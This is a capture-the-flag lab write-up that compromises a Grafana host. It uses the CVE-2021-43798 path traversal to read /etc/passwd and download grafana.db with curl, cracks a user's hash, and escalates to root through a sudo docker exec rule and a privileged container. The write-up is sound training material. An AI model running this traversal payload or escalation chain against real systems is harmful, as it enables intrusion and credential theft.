## Enumeration

As always, we start with a classical Nmap scan to get a first picture of the exposed attack surface:

```
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
| http-title: Grafana
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry
```

Only two services are reachable: SSH on port 22 and, more interestingly, an HTTP service on port 3000 identified by Nmap as **Grafana**. The `/login` redirect and the HTTP title confirm this is a standard Grafana instance, so that's where enumeration continues.

Since Grafana instances have a long track record of vulnerabilities, the first move is to fingerprint the exact version exposed and cross-check it against known CVEs, rather than poking at the login form directly.

## Foothold

A quick search points to **CVE-2021-43798**, a well-known path traversal vulnerability affecting Grafana's plugin endpoints. Unauthenticated attackers can abuse the plugin static-file handler to read arbitrary files from the underlying filesystem, without needing valid credentials.

A public PoC for this CVE is available here: [jas502n/Grafana-CVE-2021-43798](https://github.com/jas502n/Grafana-CVE-2021-43798).

Testing the exploit against the target confirms the vulnerability is present: the server happily returns the contents of `/etc/passwd`.

![alt text](/assets/img/posts/data/image.png)

Since arbitrary file read is confirmed, the next logical step is to pull Grafana's own configuration file. Configuration files are always a good target in this kind of vulnerability, as they often disclose internal paths, database locations, or secrets.

![alt text](/assets/img/posts/data/image-1.png)

Reading through the configuration, one entry stands out: the path to `grafana.db`, Grafana's default SQLite database. This file stores, among other things, user accounts and hashed passwords — a very interesting target when we already have arbitrary read access.

The traversal payload is reused with `curl` to pull the database directly to disk:

```
curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db

                                 Dload  Upload  Total   Spent   Left   Speed
100 584.0k 100 584.0k   0      0  2.10M      0                              0
```

## Credential Extraction

With `grafana.db` in hand, it's time to inspect it with `sqlite3` and look for anything useful, starting with the `user` table:

```
sqlite3 grafana.db

╰───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────╯
```

Two accounts are present: `admin` and `boris`. Both passwords are stored as salted hashes, which Grafana doesn't hash in a hashcat-friendly format out of the box, so a conversion step is required before attempting to crack them.

The `boris` account is the interesting one here, since it's an OS-level username, unlike `admin` which is Grafana-only. Using the `grafana2hashcat` tool, the stored hash and salt are converted into a crackable format:

```
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
```

The password cracks quickly to `beautiful1`, giving valid credentials for the `boris` user — and, since it's a plausible system account, it's worth trying over SSH directly rather than just inside Grafana.

## Privilege Escalation

With `boris:beautiful1`, we authenticate over SSH and land on the box as a low-privileged user:

```
boris@data:~$ id
uid=1001(boris) gid=1001(boris) groups=1001(boris)
```

As usual, the first stop for privilege escalation is checking what the user is allowed to run with elevated privileges:

```
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

This is a very common misconfiguration: `boris` can run `docker exec` as `root` on **any** container, with no password required. Since `docker exec` lets you attach an arbitrary user and drop into an arbitrary command inside a running container, this is effectively a root shell waiting to happen — we just need a container to target.

Checking the running processes reveals the container backing the Grafana instance we already compromised:


The `containerd-shim-runc-v2` line exposes the container ID (`e6ff5b1cbc85...`) tied to the Grafana process. That's all we need: we abuse the `sudo` rule to `exec` into it as `root`, explicitly requesting a privileged, root-owned shell:

```
boris@data:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash 
bash-5.1# whoami
root
```

Since the container was started with `--privileged`, it has access to the host's block devices. This means we can simply mount the host's root filesystem from inside the container and browse it as `root`:

```
bash-5.1# mount /dev/sda1 /mnt/
bash-5.1# ls /mnt/
bin             home            lib64           opt             sbin            tmp             vmlinuz.old
boot            initrd.img      lost+found      proc            snap            usr
dev             initrd.img.old  media           root            srv             var
etc             lib             mnt             run             sys             vmlinuz
```

From there, grabbing the flag from the host's `/root` directory is trivial:

```
bash-5.1# cat /mnt/root/root.txt
a8a1eae125b31a2248d7a779179c7172
```
